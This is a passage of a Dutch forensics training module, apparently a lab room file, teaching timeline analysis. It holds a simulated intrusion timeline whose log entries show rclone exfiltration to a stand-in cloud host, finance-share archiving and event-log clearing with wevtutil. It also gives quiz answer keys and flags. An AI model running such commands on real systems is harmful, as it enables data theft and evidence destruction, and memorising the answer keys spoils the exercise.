/* Room: Tijdlijnanalyse — van tijdstempel tot super-timeline */

// Hulpfunctie: geldige schrijfwijzen van een UTC-tijdstip (JJJJ-MM-DD UU:MM:SS, ISO 8601 met T/Z, of met "UTC").
const UTC = (d, t) => [`${d} ${t}`, `${d}T${t}Z`, `${d}T${t}`, `${d} ${t} UTC`, `${d} ${t}Z`, `${d} ${t} utc`];

// MFTECmd-achtige uitsnede van de $MFT van WS-LOG-12 voor het timestomping-lab (taak 4).
// rclone.exe is getimestompt: $SI B/M/A = 2019-03-14 10:00:00.0000000, $FN B = 2026-10-01 08:46:14.
// De vlag JVT{fn_verraadt_timestomping} staat in een bestandsnaam.
const MFT_LINES = `MFTECmd — uitsnede $MFT van WS-LOG-12 (tijden in UTC, 7 decimalen = 100-ns-resolutie)
Entry  Attr  B (Born/Created)             M (Modified)                 A (Accessed)                 C (MFT Changed)              Pad
41822  $SI   2026-09-28 07:41:09.3381027  2026-10-01 07:48:30.6610294  2026-10-01 07:48:30.6610294  2026-10-01 07:48:30.6610294  C:\\Users\\s.vermeulen\\Documents\\Planning_Q4.xlsx
41822  $FN   2026-09-28 07:41:09.3381027  2026-09-28 07:41:09.3381027  2026-09-28 07:41:09.3381027  2026-09-28 07:41:09.3381027  C:\\Users\\s.vermeulen\\Documents\\Planning_Q4.xlsx
41907  $SI   2026-09-30 15:12:44.9013370  2026-09-30 15:12:44.9013370  2026-10-01 07:05:02.1170033  2026-09-30 15:12:44.9013370  C:\\Users\\s.vermeulen\\Documents\\Notulen_MT.docx
41907  $FN   2026-09-30 15:12:44.9013370  2026-09-30 15:12:44.9013370  2026-09-30 15:12:44.9013370  2026-09-30 15:12:44.9013370  C:\\Users\\s.vermeulen\\Documents\\Notulen_MT.docx
88204  $SI   2026-10-01 08:46:02.7741180  2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.2210457  C:\\ProgramData\\upd
88204  $FN   2026-10-01 08:46:02.7741180  2026-10-01 08:46:02.7741180  2026-10-01 08:46:02.7741180  2026-10-01 08:46:02.7741180  C:\\ProgramData\\upd
88211  $SI   2019-03-14 10:00:00.0000000  2019-03-14 10:00:00.0000000  2019-03-14 10:00:00.0000000  2026-10-01 08:47:02.1184420  C:\\ProgramData\\upd\\rclone.exe
88211  $FN   2026-10-01 08:46:14.5123311  2026-10-01 08:46:14.5123311  2026-10-01 08:46:14.5123311  2026-10-01 08:46:14.5123311  C:\\ProgramData\\upd\\rclone.exe
88213  $SI   2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.4471209  2026-10-01 08:52:03.0904418  2026-10-01 08:46:30.4471209  C:\\ProgramData\\upd\\7za.exe
88213  $FN   2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.2210457  2026-10-01 08:46:30.2210457  C:\\ProgramData\\upd\\7za.exe
88215  $SI   2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  C:\\ProgramData\\upd\\todo_JVT{fn_verraadt_timestomping}.txt
88215  $FN   2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  2026-10-01 08:47:40.6630155  C:\\ProgramData\\upd\\todo_JVT{fn_verraadt_timestomping}.txt
88219  $SI   2026-10-01 08:52:04.0127733  2026-10-01 08:58:41.5532018  2026-10-01 09:01:10.8890012  2026-10-01 08:58:41.5532018  C:\\ProgramData\\upd\\fin_q3.7z
88219  $FN   2026-10-01 08:52:04.0127733  2026-10-01 08:52:04.0127733  2026-10-01 08:52:04.0127733  2026-10-01 08:52:04.0127733  C:\\ProgramData\\upd\\fin_q3.7z
12044  $SI   2024-05-21 09:14:52.4410983  2024-05-21 09:14:52.4410983  2026-10-01 06:58:15.0021145  2024-05-21 09:14:52.4410983  C:\\Windows\\System32\\wevtutil.exe
12044  $FN   2024-05-21 09:14:52.4410983  2024-05-21 09:14:52.4410983  2024-05-21 09:14:52.4410983  2024-05-21 09:14:52.4410983  C:\\Windows\\System32\\wevtutil.exe`;

// Super-timeline van zaak 2026-131 (WS-LOG-12, 192.0.2.45). Alle tijden zijn al genormaliseerd naar UTC.
// Verhaal: brute force via RDP -> aanmelding adm.backup 08:44:19 -> powershell -> rclone en 7za gedownload ->
// rclone getimestompt -> financiële map ingepakt -> upload naar cloudvault -> logs gewist 09:25:19.
// De vlag JVT{super_timeline_spoorzoeker} zit in de beschrijving van het rclone.conf-event.
const TIMELINE_EVENTS = [
  { t: '2026-10-01 06:58:12', src: 'System', host: 'WS-LOG-12', desc: '6005 — Event Log-service gestart (systeem opgestart)' },
  { t: '2026-10-01 06:58:40', src: 'Defender', host: 'WS-LOG-12', desc: 'Handtekeningupdate geïnstalleerd (versie 1.419.212.0)' },
  { t: '2026-10-01 07:02:40', src: 'Security', host: 'WS-LOG-12', user: 's.vermeulen', desc: '4624 aanmelding type 2 (console)' },
  { t: '2026-10-01 07:03:15', src: 'Prefetch', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'OUTLOOK.EXE-1C2E7A11.pf — uitgevoerd (run count 214)' },
  { t: '2026-10-01 07:05:18', src: 'Browser', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'Chrome-geschiedenis: https://intranet.tulpstad.example/ — "Intranet Tulpstad Logistiek"' },
  { t: '2026-10-01 07:15:44', src: 'Prefetch', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'MS-TEAMS.EXE-5B90D3E2.pf — uitgevoerd (run count 88)' },
  { t: '2026-10-01 07:31:02', src: 'Proxy', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'GET https://weer.example/vandaag — 200, 48 kB' },
  { t: '2026-10-01 07:48:30', src: 'MFT', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'C:\\Users\\s.vermeulen\\Documents\\Planning_Q4.xlsx — gewijzigd (M)' },
  { t: '2026-10-01 07:48:35', src: 'LNK', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'Recent\\Planning_Q4.xlsx.lnk bijgewerkt — doel C:\\Users\\s.vermeulen\\Documents\\Planning_Q4.xlsx' },
  { t: '2026-10-01 08:05:11', src: 'Firewall', host: 'WS-LOG-12', desc: 'DENY TCP 198.51.100.23:44120 → 192.0.2.45:445 (SMB van buiten)' },
  { t: '2026-10-01 08:21:37', src: 'Proxy', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'GET https://teams.tulpstad.example/api/presence — 200' },
  { t: '2026-10-01 08:30:02', src: 'Security', host: 'WS-LOG-12', user: 's.vermeulen', desc: '4800 — werkstation vergrendeld (koffiepauze)' },
  { t: '2026-10-01 08:40:02', src: 'Firewall', host: 'WS-LOG-12', desc: 'ALLOW TCP 203.0.113.77:51502 → 192.0.2.45:3389 (RDP)' },
  { t: '2026-10-01 08:40:03', src: 'Security', host: 'WS-LOG-12', user: 'administrator', desc: '4625 MISLUKTE aanmelding type 10 (RDP) vanaf 203.0.113.77 — Status 0xC000006A' },
  { t: '2026-10-01 08:40:41', src: 'Security', host: 'WS-LOG-12', user: 'administrator', desc: '4625 MISLUKTE aanmelding type 10 (RDP) vanaf 203.0.113.77 — Status 0xC000006A' },
  { t: '2026-10-01 08:41:19', src: 'Security', host: 'WS-LOG-12', user: 'admin', desc: '4625 MISLUKTE aanmelding type 10 (RDP) vanaf 203.0.113.77 — Status 0xC0000064 (onbekende gebruiker)' },
  { t: '2026-10-01 08:41:58', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4625 MISLUKTE aanmelding type 10 (RDP) vanaf 203.0.113.77 — Status 0xC000006A' },
  { t: '2026-10-01 08:42:36', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4625 MISLUKTE aanmelding type 10 (RDP) vanaf 203.0.113.77 — Status 0xC000006A' },
  { t: '2026-10-01 08:43:58', src: 'Firewall', host: 'WS-LOG-12', desc: 'ALLOW TCP 203.0.113.77:51544 → 192.0.2.45:3389 (RDP)' },
  { t: '2026-10-01 08:44:19', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4624 aanmelding GESLAAGD type 10 (RDP) vanaf 203.0.113.77' },
  { t: '2026-10-01 08:44:19', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4672 — speciale rechten toegekend (SeDebugPrivilege, SeBackupPrivilege)' },
  { t: '2026-10-01 08:44:22', src: 'TerminalServices', host: 'WS-LOG-12', user: 'adm.backup', desc: '21 — sessie-aanmelding geslaagd, bronadres 203.0.113.77' },
  { t: '2026-10-01 08:45:37', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4688 nieuw proces: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (ouder: explorer.exe)' },
  { t: '2026-10-01 08:45:47', src: 'Prefetch', host: 'WS-LOG-12', desc: 'POWERSHELL.EXE-022A1004.pf bijgewerkt — laatste uitvoering 08:45:37' },
  { t: '2026-10-01 08:46:02', src: 'MFT', host: 'WS-LOG-12', user: 'adm.backup', desc: 'C:\\ProgramData\\upd\\ — map aangemaakt (B)' },
  { t: '2026-10-01 08:46:11', src: 'Proxy', host: 'WS-LOG-12', user: 'adm.backup', desc: 'GET https://dl.toolmirror.example/rclone-v1.68-windows-amd64.zip — 200, 21 MB (198.51.100.66) — User-Agent: WindowsPowerShell/5.1' },
  { t: '2026-10-01 08:46:14', src: 'MFT', host: 'WS-LOG-12', user: 'adm.backup', desc: 'C:\\ProgramData\\upd\\rclone.exe — aangemaakt ($FN B = 08:46:14)' },
  { t: '2026-10-01 08:46:29', src: 'Proxy', host: 'WS-LOG-12', user: 'adm.backup', desc: 'GET https://dl.toolmirror.example/7za.exe — 200, 1,2 MB (198.51.100.66)' },
  { t: '2026-10-01 08:46:30', src: 'MFT', host: 'WS-LOG-12', user: 'adm.backup', desc: 'C:\\ProgramData\\upd\\7za.exe — aangemaakt (B)' },
  { t: '2026-10-01 08:47:02', src: 'UsnJrnl', host: 'WS-LOG-12', desc: 'rclone.exe — reden BASIC_INFO_CHANGE ($SI-tijden aangepast naar 2019-03-14 10:00:00)' },
  { t: '2026-10-01 08:47:40', src: 'MFT', host: 'WS-LOG-12', user: 'adm.backup', desc: 'C:\\ProgramData\\upd\\rclone.conf — aangemaakt (342 bytes). Fragment: [cv] type = webdav, url = https://upload.cloudvault.example/, user = drop_JVT{super_timeline_spoorzoeker}' },
  { t: '2026-10-01 08:49:02', src: 'Browser', host: 'WS-LOG-12', user: 'adm.backup', desc: 'Edge-geschiedenis: https://cloudvault.example/login — "CloudVault — Inloggen"' },
  { t: '2026-10-01 08:51:30', src: 'JumpList', host: 'WS-LOG-12', user: 'adm.backup', desc: 'Verkenner-jumplist: \\\\FS01\\Finance\\Jaarcijfers geopend' },
  { t: '2026-10-01 08:52:03', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4688 nieuw proces: C:\\ProgramData\\upd\\7za.exe a -mx9 -p**** C:\\ProgramData\\upd\\fin_q3.7z \\\\FS01\\Finance\\Jaarcijfers\\*' },
  { t: '2026-10-01 08:52:13', src: 'Prefetch', host: 'WS-LOG-12', desc: '7ZA.EXE-9D4C21B0.pf aangemaakt — eerste uitvoering 08:52:03 (run count 1)' },
  { t: '2026-10-01 08:55:00', src: 'TaskScheduler', host: 'WS-LOG-12', desc: 'Taak \\Microsoft\\Office\\OfficeTelemetryAgentLogOn gestart (ruis)' },
  { t: '2026-10-01 08:58:41', src: 'MFT', host: 'WS-LOG-12', user: 'adm.backup', desc: 'C:\\ProgramData\\upd\\fin_q3.7z — gewijzigd (M), grootte 1,84 GB (archief compleet)' },
  { t: '2026-10-01 09:01:10', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4688 nieuw proces: C:\\ProgramData\\upd\\rclone.exe copy C:\\ProgramData\\upd\\fin_q3.7z cv:drop --transfers 8' },
  { t: '2026-10-01 09:01:14', src: 'Proxy', host: 'WS-LOG-12', user: 'adm.backup', desc: 'CONNECT upload.cloudvault.example:443 (198.51.100.140) — toegestaan, categorie "Cloudopslag"' },
  { t: '2026-10-01 09:01:20', src: 'Prefetch', host: 'WS-LOG-12', desc: 'RCLONE.EXE-4F7A88C1.pf aangemaakt — eerste uitvoering 09:01:10 (run count 1)' },
  { t: '2026-10-01 09:10:00', src: 'System', host: 'WS-LOG-12', desc: '7036 — service Windows Update is gestart (ruis)' },
  { t: '2026-10-01 09:24:47', src: 'Firewall', host: 'WS-LOG-12', desc: 'Sessie gesloten TCP 192.0.2.45:50112 → 198.51.100.140:443 — verzonden 1,97 GB, ontvangen 4 MB' },
  { t: '2026-10-01 09:25:12', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4688 nieuw proces: C:\\Windows\\System32\\wevtutil.exe cl Security' },
  { t: '2026-10-01 09:25:19', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '1102 — het auditlogboek (Security) is GEWIST' },
  { t: '2026-10-01 09:25:21', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4688 nieuw proces: C:\\Windows\\System32\\wevtutil.exe cl System' },
  { t: '2026-10-01 09:25:22', src: 'System', host: 'WS-LOG-12', user: 'adm.backup', desc: '104 — het System-logboek is GEWIST' },
  { t: '2026-10-01 09:26:05', src: 'MFT', host: 'WS-LOG-12', desc: 'C:\\ProgramData\\upd\\7za.exe — MFT-record 88213 gemarkeerd als niet in gebruik (verwijderd)' },
  { t: '2026-10-01 09:26:40', src: 'Security', host: 'WS-LOG-12', user: 'adm.backup', desc: '4647 — afmelding gestart door gebruiker' },
  { t: '2026-10-01 09:26:41', src: 'TerminalServices', host: 'WS-LOG-12', user: 'adm.backup', desc: '23 — sessie-afmelding geslaagd' },
  { t: '2026-10-01 09:31:15', src: 'Security', host: 'WS-LOG-12', user: 's.vermeulen', desc: '4801 — werkstation ontgrendeld' },
  { t: '2026-10-01 09:33:02', src: 'Browser', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'Chrome-geschiedenis: https://intranet.tulpstad.example/nieuws — "Nieuws"' },
  { t: '2026-10-01 09:40:27', src: 'Proxy', host: 'WS-LOG-12', user: 's.vermeulen', desc: 'GET https://weer.example/radar — 200, 310 kB' },
  { t: '2026-10-01 10:02:44', src: 'Defender', host: 'WS-LOG-12', desc: 'Snelle scan voltooid — 0 bedreigingen gevonden' },
];

CS.registerRoom({
  id: 'tijdlijnanalyse',
  path: 'forensie',
  order: 9.5,
  title: 'Tijdlijnanalyse: van tijdstempel tot super-timeline',
  icon: '⏳',
  difficulty: 'Moeilijk',
  minutes: 70,
  summary: 'Elk spoor heeft een tijd, maar elke bron telt anders. Leer tijdstempels omrekenen, tijdzones en klokafwijking rechtzetten, timestomping ontmaskeren en uit tientallen bronnen één sluitende super-timeline bouwen.',
  objectives: [
    'Uitleggen waarom de tijdlijn het hart van een forensisch onderzoek is',
    'Tijden normaliseren naar UTC, rekening houdend met CET/CEST (zomertijd) en klokafwijking (clock skew)',
    'Unix-, Windows FILETIME-, Chrome/WebKit- en Apple/Cocoa-tijdstempels herkennen en omrekenen',
    'MACB-tijden in NTFS lezen en timestomping herkennen door $STANDARD_INFORMATION en $FILE_NAME te vergelijken',
    'Bronnen voor een super-timeline benoemen en de rol van Plaso/log2timeline en Timeline Explorer uitleggen',
    'Een incident chronologisch reconstrueren en rapporteren met bron per bewering, feiten gescheiden van interpretatie',
  ],
  tasks: [
    {
      title: 'Taak 1 — De tijdlijn: het hart van elk onderzoek',
      content: `
        <p>Een rechercheur die een inbraak in een woning onderzoekt, wil vooral één ding weten: <em>wat gebeurde er, in welke volgorde?</em> Hoe laat ging het raam open, wanneer ging het alarm af, wanneer reed de auto weg? Pas als die volgorde klopt, snap je het verhaal. Digitaal is dat precies hetzelfde. Bijna elke vraag in een onderzoek — "hoe kwam de aanvaller binnen?", "wat heeft hij meegenomen?", "was het de medewerker zelf?" — beantwoord je met een <strong>tijdlijn</strong> (timeline).</p>

        <div class="callout tip"><strong>Analogie:</strong> zie elke bron als één bewakingscamera in een winkelcentrum. Camera 1 ziet iemand binnenkomen, camera 2 ziet hem bij de kassa, camera 3 bij de uitgang. Los zegt elke camera weinig. Leg je de beelden op één tijdas naast elkaar, dan ontstaat het verhaal. Een <strong>super-timeline</strong> is precies dat: alle "camera's" van een computer op één tijdas.</div>

        <h3>Waarom de tijdlijn zo krachtig is</h3>
        <ul>
          <li><strong>Context</strong> — een losse gebeurtenis ("powershell.exe gestart") is vaak onschuldig. Twintig seconden na een RDP-aanmelding vanaf een onbekend IP-adres is hij ineens heel verdacht.</li>
          <li><strong>Oorzaak en gevolg</strong> — wat er <em>vlak voor</em> een verdachte gebeurtenis gebeurde, is vaak de oorzaak. Dat noemen we <strong>pivoteren</strong> (pivoting): vanuit één bekend punt kijk je wat er rond dat tijdstip nog meer gebeurde.</li>
          <li><strong>Gaten en tegenstrijdigheden</strong> — een logboek dat ineens leeg is, of een bestand dat "in 2019" is aangemaakt in een map van vandaag: zulke afwijkingen vallen pas op als je alles naast elkaar legt.</li>
          <li><strong>Het verhaal voor de rechter of directie</strong> — een chronologisch verslag is voor niet-technici het makkelijkst te volgen.</li>
        </ul>

        <h3>Van één bron naar veel bronnen</h3>
        <p>In eerdere rooms zag je al losse sporen: eventlogs, Prefetch, de $MFT, LNK-bestanden. Elk van die bronnen heeft zijn eigen tijdstempels, in zijn eigen formaat en soms in zijn eigen tijdzone. De kunst van tijdlijnanalyse bestaat uit drie stappen:</p>
        <ol>
          <li><strong>Verzamelen</strong> — tijdstempels uit zoveel mogelijk bronnen halen.</li>
          <li><strong>Normaliseren</strong> — alles omrekenen naar één formaat en één tijdzone (UTC).</li>
          <li><strong>Analyseren</strong> — filteren, sorteren en pivoteren tot het verhaal duidelijk is.</li>
        </ol>
        <p>In deze room oefen je alle drie, van één los getal tot een volledige super-timeline van een werkstation.</p>

        <div class="callout info"><strong>Nederlandse context:</strong> bij een melding aan de Autoriteit Persoonsgegevens (datalek) of aan het NCSC onder de Cyberbeveiligingswet (NIS2) moet je vaak aangeven <em>wanneer</em> het incident begon en wanneer je het ontdekte. Zonder betrouwbare tijdlijn kun je die vragen niet eerlijk beantwoorden.</div>
      `,
      questions: [
        { q: 'Hoe noem je een tijdlijn waarin de tijdstempels van veel verschillende bronnen op één tijdas zijn samengevoegd?', answer: ['super-timeline', 'supertimeline', 'super timeline', 'super-tijdlijn'], hint: 'Een "super" versie van een timeline.', explain: 'Een super-timeline voegt eventlogs, bestandssysteem, browser, netwerk en meer samen in één chronologisch overzicht.' },
        { q: 'Je ziet "powershell.exe gestart" en kijkt wat er op dat systeem in de minuten ervoor en erna gebeurde. Hoe heet die techniek?', options: ['Carving', 'Pivoteren', 'Hashen', 'Timestomping'], answer: 1, explain: 'Pivoteren is vanuit één bekend punt (een tijdstip, account of IP) verder zoeken naar wat er rondom gebeurde.' },
        { q: 'Wat zijn de drie stappen van tijdlijnanalyse in de juiste volgorde?', options: ['Analyseren, verzamelen, rapporteren', 'Verzamelen, normaliseren, analyseren', 'Normaliseren, wissen, verzamelen', 'Hashen, verzamelen, carven'], answer: 1, explain: 'Eerst verzamel je de tijdstempels, dan breng je ze naar één formaat en tijdzone, en pas daarna analyseer je.' },
      ],
    },

    {
      title: 'Taak 2 — Tijdzones, UTC, zomertijd en klokafwijking',
      content: `
        <p>Stel: de firewall zegt dat er om 10:44 een verbinding binnenkwam, en het eventlog zegt dat de aanmelding om 08:44 was. Was dat twee uur later, of is het hetzelfde moment? Dat hangt af van de <strong>tijdzone</strong> waarin elke bron zijn tijd opschrijft. Dit is in de praktijk de nummer-één-oorzaak van foute conclusies.</p>

        <h3>UTC als gemeenschappelijke taal</h3>
        <p><strong>UTC</strong> (Coordinated Universal Time) is de wereldwijde referentietijd, zonder zomertijd. Forensisch onderzoekers werken <strong>altijd in UTC</strong> en rekenen pas in het rapport, waar nodig, om naar lokale tijd. Nederland gebruikt de tijdzone <code>Europe/Amsterdam</code>:</p>
        <table>
          <thead><tr><th>Periode</th><th>Naam</th><th>Verschil met UTC</th><th>Voorbeeld</th></tr></thead>
          <tbody>
            <tr><td>Wintertijd</td><td><strong>CET</strong> (Midden-Europese Tijd)</td><td>UTC+1</td><td>09:00 CET = 08:00 UTC</td></tr>
            <tr><td>Zomertijd</td><td><strong>CEST</strong> (Midden-Europese Zomertijd)</td><td>UTC+2</td><td>10:44 CEST = 08:44 UTC</td></tr>
          </tbody>
        </table>
        <p>De zomertijd begint op de <strong>laatste zondag van maart</strong> om 01:00 UTC (de klok springt van 02:00 naar 03:00) en eindigt op de <strong>laatste zondag van oktober</strong> om 01:00 UTC (de klok gaat van 03:00 terug naar 02:00). In 2026 is dat op <strong>29 maart</strong> en <strong>25 oktober</strong>.</p>

        <div class="callout warn"><strong>Valkuil:</strong> op 25 oktober 2026 komt het lokale tijdstip 02:30 <em>twee keer</em> voor: eerst als 02:30 CEST (00:30 UTC) en een uur later als 02:30 CET (01:30 UTC). Op 29 maart bestaat 02:30 lokale tijd juist <em>helemaal niet</em>. Een log met alleen "02:30" en zonder tijdzone is op zulke dagen dubbelzinnig.</div>

        <h3>Welke bron gebruikt wat?</h3>
        <ul>
          <li>NTFS-tijden, Windows-eventlogs (intern) en de meeste browserdatabases slaan tijden op in <strong>UTC</strong>.</li>
          <li>Veel tekstlogs (een webserver, een firewall, een proxy) schrijven <strong>lokale tijd</strong>, soms zonder het erbij te zetten.</li>
          <li>Tools tonen tijden vaak in de tijdzone van <em>jouw</em> analysecomputer. Controleer dus altijd de instelling van je tool.</li>
        </ul>

        <h3>Klokafwijking (clock skew)</h3>
        <p>Ook als de tijdzone klopt, kan de klok zelf scheef lopen. Een werkstation dat geen tijdsynchronisatie (NTP) krijgt, loopt na weken soms minuten voor of achter. Dat heet <strong>klokafwijking</strong> (clock skew). Je bepaalt de afwijking door een gebeurtenis te zoeken die in twee bronnen staat, bijvoorbeeld een aanmelding die zowel op het werkstation als op de (wél gesynchroniseerde) domeincontroller staat.</p>
        <p><strong>Voorbeeld:</strong> de domeincontroller registreert een aanmelding om 08:44:19 UTC; het werkstation zegt 08:47:39. Het werkstation loopt dus <strong>3 minuten en 20 seconden vóór</strong>. Elke tijd van dat werkstation corrigeer je door er 3:20 vanaf te halen.</p>

        <div class="callout tip"><strong>Gouden regel:</strong> normaliseer alles naar UTC, corrigeer voor bekende klokafwijking, en <strong>documenteer</strong> per bron welke tijdzone en welke correctie je hebt toegepast — inclusief hoe je die afwijking hebt vastgesteld. Zo kan een collega (of de advocaat van de tegenpartij) je berekening narekenen.</div>
      `,
      questions: [
        { q: 'Een proxylog in Nederlandse tijd meldt een verbinding op 14 juli 2026 om 14:30 lokale tijd. Hoe laat was dat in UTC? (formaat UU:MM)', answer: ['12:30', '12:30:00', '12.30', '12:30 utc'], hint: 'In juli geldt de zomertijd (CEST).', explain: 'In juli geldt CEST = UTC+2, dus 14:30 lokaal = 12:30 UTC.' },
        { q: 'Een werkstation loopt 3 minuten en 20 seconden vóór. Het eventlog toont 10:15:40. Wat is het werkelijke tijdstip? (formaat UU:MM:SS)', answer: ['10:12:20', '10.12.20'], hint: 'Loopt de klok voor, dan trek je de afwijking ervan af.', explain: '10:15:40 min 3:20 = 10:12:20. Noteer die correctie in je rapport.' },
        { q: 'Waarom is een log met alleen "2026-10-25 02:30" (lokale tijd, zonder tijdzone) dubbelzinnig?', options: ['Omdat die tijd op die dag niet bestaat', 'Omdat 02:30 die nacht twee keer voorkomt: eerst in CEST en daarna in CET', 'Omdat UTC op die dag een uur verspringt', 'Omdat logs altijd in UTC staan'], answer: 1, explain: 'Bij het eind van de zomertijd gaat de klok van 03:00 terug naar 02:00, dus 02:30 komt twee keer voor (00:30 en 01:30 UTC).' },
        { q: 'Wat is het verschil tussen Nederlandse wintertijd (CET) en UTC?', options: ['UTC-1', 'UTC+1', 'UTC+2', 'Geen verschil'], answer: 1, explain: 'CET is UTC+1; in de zomer (CEST) is het UTC+2.' },
      ],
    },

    {
      title: 'Taak 3 — Tijdstempelformaten ontcijferen',
      content: `
        <p>Een tijdstempel in een database of binair bestand ziet er zelden uit als "1 oktober 2026, 08:12". Meestal is het een groot getal: het aantal seconden (of kleinere eenheden) sinds een vast beginpunt, het <strong>epoch</strong>. Elk systeem kiest een ander beginpunt en een andere eenheid. Herken je het formaat, dan kun je het getal omrekenen.</p>

        <div class="callout tip"><strong>Analogie:</strong> "het is dag 300" zegt niets, totdat je weet <em>sinds wanneer</em> er geteld wordt en of het om dagen of uren gaat. Een tijdstempel is net zo: epoch + eenheid + getal.</div>

        <table>
          <thead><tr><th>Formaat</th><th>Epoch (beginpunt)</th><th>Eenheid</th><th>Typische lengte (2026)</th><th>Waar je het ziet</th></tr></thead>
          <tbody>
            <tr><td><strong>Unix-tijd</strong></td><td>1970-01-01 00:00:00 UTC</td><td>seconden</td><td>10 cijfers (17…)</td><td>Linux, logs, JWT, veel apps</td></tr>
            <tr><td><strong>Unix-tijd (ms)</strong></td><td>1970-01-01 00:00:00 UTC</td><td>milliseconden</td><td>13 cijfers</td><td>JavaScript, Java, veel API's</td></tr>
            <tr><td><strong>Windows FILETIME</strong></td><td>1601-01-01 00:00:00 UTC</td><td>100 nanoseconden</td><td>18 cijfers (134…)</td><td>NTFS ($MFT), registry, eventlogs</td></tr>
            <tr><td><strong>Chrome/WebKit</strong></td><td>1601-01-01 00:00:00 UTC</td><td>microseconden</td><td>17 cijfers (134…)</td><td>Chrome- en Edge-geschiedenis</td></tr>
            <tr><td><strong>Apple/Cocoa</strong></td><td>2001-01-01 00:00:00 UTC</td><td>seconden</td><td>9 cijfers (8…)</td><td>macOS, iOS (Safari, berichten)</td></tr>
          </tbody>
        </table>

        <h3>Rekenvoorbeeld</h3>
        <p>De waarde <code>1790845335123</code> heeft 13 cijfers en begint met 17: vrijwel zeker Unix-tijd in milliseconden. Deel door 1000 en je krijgt 1790845335,123 seconden sinds 1970: dat is <strong>2026-10-01 09:02:15.123 UTC</strong> (11:02:15 Nederlandse zomertijd). De omrekening van FILETIME naar Unix-tijd gaat zo: deel door 10.000 (naar milliseconden) en trek 11.644.473.600.000 ms af (het verschil tussen 1601 en 1970).</p>
        <pre><code>// FILETIME -&gt; datum, in Node.js of de browserconsole
new Date(Number(133720000000000000n / 10000n - 11644473600000n)).toISOString()</code></pre>

        <h3>Nu jij</h3>
        <p>Gebruik het lab hieronder om de volgende waarden om te rekenen. Het lab laat per getal zien welke interpretaties een plausibele datum opleveren; kies de interpretatie die bij de <em>bron</em> past. Geef je antwoord in UTC als <code>JJJJ-MM-DD UU:MM:SS</code>.</p>
        <ol>
          <li><code>134353159230000000</code> — uit het $STANDARD_INFORMATION-attribuut van een bestand in de $MFT.</li>
          <li><code>1774745999</code> — uit een Linux-authlog in JSON-formaat.</li>
          <li><code>13435317107000000</code> — kolom <code>last_visit_time</code> uit de Chrome-database <code>History</code>.</li>
          <li><code>805755930</code> — een tijdstempel uit een iPhone-back-up (Apple/Cocoa).</li>
        </ol>
        <div class="callout warn"><strong>Let op:</strong> één getal kan in meerdere formaten een "geldige" datum opleveren. Kies nooit alleen op basis van wat plausibel lijkt, maar op basis van de bron: een Chrome-database gebruikt WebKit-tijd, de $MFT gebruikt FILETIME. Kijk bij waarde 2 ook eens naar de Nederlandse tijd: wat gebeurde er één seconde later?</div>
      `,
      lab: { type: 'timestamp', value: '134353159230000000' },
      questions: [
        { q: 'Welk tijdstip (UTC) is FILETIME 134353159230000000? (JJJJ-MM-DD UU:MM:SS)', answer: UTC('2026-10-01', '08:12:03'), hint: 'FILETIME: 100-ns-intervallen sinds 1601-01-01. Het lab rekent het voor je om.', explain: '134353159230000000 / 10.000 − 11.644.473.600.000 ms = 2026-10-01 08:12:03 UTC (10:12:03 CEST).' },
        { q: 'Welk tijdstip (UTC) is Unix-tijd 1774745999? (JJJJ-MM-DD UU:MM:SS)', answer: UTC('2026-03-29', '00:59:59'), hint: '10 cijfers: seconden sinds 1970-01-01.', explain: '1774745999 = 2026-03-29 00:59:59 UTC = 01:59:59 CET. Eén seconde later begint de zomertijd en springt de Nederlandse klok naar 03:00:00 CEST.' },
        { q: 'Welk tijdstip (UTC) is Chrome/WebKit-tijd 13435317107000000? (JJJJ-MM-DD UU:MM:SS)', answer: UTC('2026-10-01', '08:31:47'), hint: 'WebKit: microseconden sinds 1601-01-01. Interpreteer het niet als FILETIME.', explain: '13435317107000000 µs sinds 1601 = 2026-10-01 08:31:47 UTC. Als FILETIME gelezen zou je een datum in de 17e eeuw krijgen.' },
        { q: 'Welk tijdstip (UTC) is Apple/Cocoa-tijd 805755930? (JJJJ-MM-DD UU:MM:SS)', answer: UTC('2026-07-14', '21:05:30'), hint: 'Cocoa: seconden sinds 2001-01-01. Als Unix-tijd zou het in 1995 vallen.', explain: '805755930 + 978307200 (het verschil tussen 1970 en 2001) = Unix 1784063130 = 2026-07-14 21:05:30 UTC (23:05:30 CEST).' },
      ],
    },

    {
      title: 'Taak 4 — MACB in NTFS en het ontmaskeren van timestomping',
      content: `
        <p>In de room over bestandssystemen leerde je de MAC-tijden. In NTFS zijn het er eigenlijk vier, en in tijdlijnen schrijven we ze als <strong>MACB</strong>:</p>
        <table>
          <thead><tr><th>Letter</th><th>Betekenis</th><th>Wanneer verandert hij?</th></tr></thead>
          <tbody>
            <tr><td><strong>M</strong></td><td>Modified</td><td>De inhoud van het bestand is gewijzigd</td></tr>
            <tr><td><strong>A</strong></td><td>Accessed</td><td>Het bestand is gelezen (vaak vertraagd of uitgeschakeld bijgewerkt)</td></tr>
